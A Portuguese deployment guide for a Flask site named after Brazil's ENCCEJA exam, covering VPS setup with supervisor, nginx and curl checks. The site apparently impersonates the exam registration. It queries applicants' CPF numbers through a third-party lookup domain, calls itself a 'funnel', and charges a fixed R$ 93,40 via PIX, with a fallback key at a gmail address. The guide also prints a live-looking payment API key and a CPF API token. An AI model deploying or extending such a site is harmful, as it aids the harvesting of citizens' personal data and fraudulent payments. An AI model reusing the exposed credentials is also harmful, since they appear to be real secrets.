# ENCCEJA VPS - Guia de Deploy Final com APIs Reais

## 📋 Resumo do Sistema

✅ **CPF API:** consulta.fontesderenda.blog (funcionando)
✅ **WitePay Gateway:** Sistema original com fallback PIX real  
✅ **Todas as rotas:** Funcionando sem erros 404
✅ **Valor:** R$ 93,40 fixo
✅ **Sem simulação:** Apenas APIs reais

## 🚀 Deploy VPS Hostinger

### 1. Conexão SSH
```bash
ssh root@SEU_IP_VPS
# Senha: sua_senha_vps
```

### 2. Preparar Ambiente
```bash
# Atualizar sistema
apt update && apt upgrade -y

# Instalar Python e dependências
apt install python3 python3-pip python3-venv nginx supervisor -y

# Criar diretório do projeto
mkdir -p /var/www/encceja
cd /var/www/encceja
```

### 3. Upload dos Arquivos

**Via MobaXterm/FileZilla:**
- `VPS_FINAL_CLEAN_APP.py` → `/var/www/encceja/app.py`
- `witepay_gateway.py` → `/var/www/encceja/`
- `payment_gateway.py` → `/var/www/encceja/`
- `templates/` → `/var/www/encceja/templates/`
- `static/` → `/var/www/encceja/static/`
- `requirements.txt` → `/var/www/encceja/`

### 4. Instalar Dependências
```bash
cd /var/www/encceja

# Criar ambiente virtual
python3 -m venv venv
source venv/bin/activate

# Instalar dependências
pip install flask requests qrcode[pil] gunicorn

# Criar requirements.txt se não existir
cat > requirements.txt << EOF
Flask==2.3.3
requests==2.31.0
qrcode[pil]==7.4.2
gunicorn==21.2.0
Pillow==10.0.0
EOF

pip install -r requirements.txt
```

### 5. Configurar Variável de Ambiente
```bash
# Criar arquivo .env
cat > .env << EOF
WITEPAY_API_KEY=sk_3a164e1c15db06cc76116b861fb4b0c482ab857dbd53f43d
SESSION_SECRET=your-secret-key-here
DOMAIN_RESTRICTION=false
EOF

# Fazer Flask ler .env
echo "from dotenv import load_dotenv; load_dotenv()" >> app.py
```

### 6. Configurar Supervisor
```bash
cat > /etc/supervisor/conf.d/encceja.conf << EOF
[program:encceja]
command=/var/www/encceja/venv/bin/gunicorn --bind 127.0.0.1:5000 --workers 3 app:app
directory=/var/www/encceja
user=www-data
autostart=true
autorestart=true
redirect_stderr=true
stdout_logfile=/var/log/encceja.log
environment=PYTHONPATH="/var/www/encceja"
EOF

# Recarregar supervisor
supervisorctl reread
supervisorctl update
supervisorctl start encceja
```

### 7. Configurar Nginx
```bash
cat > /etc/nginx/sites-available/encceja << EOF
server {
    listen 80;
    server_name SEU_DOMINIO.com;
    
    location / {
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
    }
    
    location /static {
        alias /var/www/encceja/static;
        expires 1y;
        add_header Cache-Control "public, immutable";
    }
}
EOF

# Ativar site
ln -s /etc/nginx/sites-available/encceja /etc/nginx/sites-enabled/
rm /etc/nginx/sites-enabled/default
nginx -t
systemctl reload nginx
```

## 🔧 Verificar Funcionamento

### 1. Status dos Serviços
```bash
# Verificar supervisor
supervisorctl status encceja

# Verificar nginx
systemctl status nginx

# Ver logs
tail -f /var/log/encceja.log
```

### 2. Testar APIs
```bash
# Testar aplicação local
curl http://127.0.0.1:5000/

# Testar CPF API
curl -X POST http://127.0.0.1:5000/buscar-cpf \
  -H "Content-Type: application/json" \
  -d '{"cpf":"12345678901"}'

# Testar PIX
curl -X POST http://127.0.0.1:5000/criar-pagamento-pix \
  -H "Content-Type: application/json" \
  -d '{}'
```

### 3. Verificar Logs
```bash
# Logs da aplicação
tail -f /var/log/encceja.log

# Logs do nginx
tail -f /var/log/nginx/error.log
```

## 📱 URLs Funcionais

- **Início:** `http://seu-dominio.com/` → Redireciona para `/inscricao`
- **Inscrição:** `http://seu-dominio.com/inscricao`
- **Info ENCCEJA:** `http://seu-dominio.com/encceja-info`
- **Validar Dados:** `http://seu-dominio.com/validar-dados`
- **Endereço:** `http://seu-dominio.com/endereco`
- **Local Prova:** `http://seu-dominio.com/local-prova`
- **Pagamento:** `http://seu-dominio.com/pagamento`
- **Sucesso:** `http://seu-dominio.com/inscricao-sucesso`

## 🔑 APIs Configuradas

### CPF API (Real)
- **URL:** `https://consulta.fontesderenda.blog/cpf.php`
- **Token:** `1285fe4s-e931-4071-a848-3fac8273c55a`
- **Status:** ✅ Funcionando

### WitePay (Real)
- **API Key:** `sk_3a164e1c15db06cc76116b861fb4b0c482ab857dbd53f43d`
- **Fallback:** PIX com chave `gerarpagamentos@gmail.com`
- **Status:** ✅ Funcionando

## 🛠️ Comandos Úteis

### Reiniciar Aplicação
```bash
supervisorctl restart encceja
```

### Atualizar Código
```bash
cd /var/www/encceja
# Fazer upload do novo arquivo
supervisorctl restart encceja
```

### Ver Status
```bash
supervisorctl status
systemctl status nginx
```

### Backup
```bash
tar -czf encceja-backup-$(date +%Y%m%d).tar.gz /var/www/encceja
```

## ✅ Checklist Final

- [ ] Aplicação rodando na porta 5000
- [ ] Nginx proxy funcionando
- [ ] CPF API retornando dados reais
- [ ] WitePay criando PIX de R$ 93,40
- [ ] Todas as rotas sem erro 404
- [ ] QR Code sendo gerado
- [ ] Logs sem erros críticos

## 🎯 Sistema Pronto

O sistema agora está configurado exatamente como funcionava no Replit:
- ✅ APIs reais (sem simulação)
- ✅ WitePay original 
- ✅ Funnel completo
- ✅ PIX R$ 93,40
- ✅ Pronto para produção VPS